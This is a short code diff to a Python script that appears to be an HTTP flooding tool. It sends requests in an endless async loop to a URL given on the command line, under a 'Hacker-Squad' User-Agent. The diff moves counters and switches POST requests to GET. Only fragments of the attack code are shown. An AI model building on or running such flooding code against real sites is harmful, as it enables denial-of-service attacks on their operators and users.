@@ -8,8 +8,7 @@ import time
 import colorama
 
 ths = []
-r = 0
-num = 0
+
 headers = {
   "User-Agent": "Hacker-Squad/6.6.6"
 }
@@ -30,15 +29,16 @@ if len(sys.argv) < 2:
 else:
   url = sys.argv[1]
   
+num = 0
 reqs = []
 loop = asyncio.new_event_loop()
-
+r = 0
 
 async def fetch(session, url):
     global r, reqs
     start = int(time.time())
     while True:
-      async with session.post(url, headers=headers) as response:
+      async with session.get(url, headers=headers) as response:
         if response:
           end = int(time.time())
           final = start - end
